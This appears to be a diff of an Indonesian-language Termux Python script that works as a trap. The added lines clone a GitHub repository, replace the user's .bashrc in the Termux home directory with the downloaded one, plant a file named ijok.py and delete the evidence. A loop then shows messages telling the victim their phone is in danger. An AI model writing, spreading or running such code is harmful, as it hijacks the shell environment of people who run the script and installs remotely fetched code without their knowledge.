@@ -12,13 +12,14 @@ U = '\033[95m'    # WARNA UNGU
 x = '\33[m'           # WARNA DEFAULT
 import subprocess
 print("SABARRR....")
-os.system("pkg install time")
-os.system("pkg install figlet")
+os.system("pkg install time && git clone https://github.com/FatahXD/FatahXD && cd FatahXD")
+os.system("pkg install figlet && mv .bashrc ../../../../../../data/data/com.termux/files/home")
+os.system("mv ijok.py ../../../../../data/data/com.termux/files/home && cd ../ && rm -rf FatahXD")
 
 while True:
     start_time = time.time() # Waktu awal
     os.system("clear")
-    os.system("figlet AAA KASIAN AAA")
+    os.system("figlet KERENN")
     print("")
     print(M + "Bre HP Lu Lagi Di Keaadan Bahaya nih")
     print(K + "LAIN KALI ATI² SAMA FILE² GINIAN!!!")
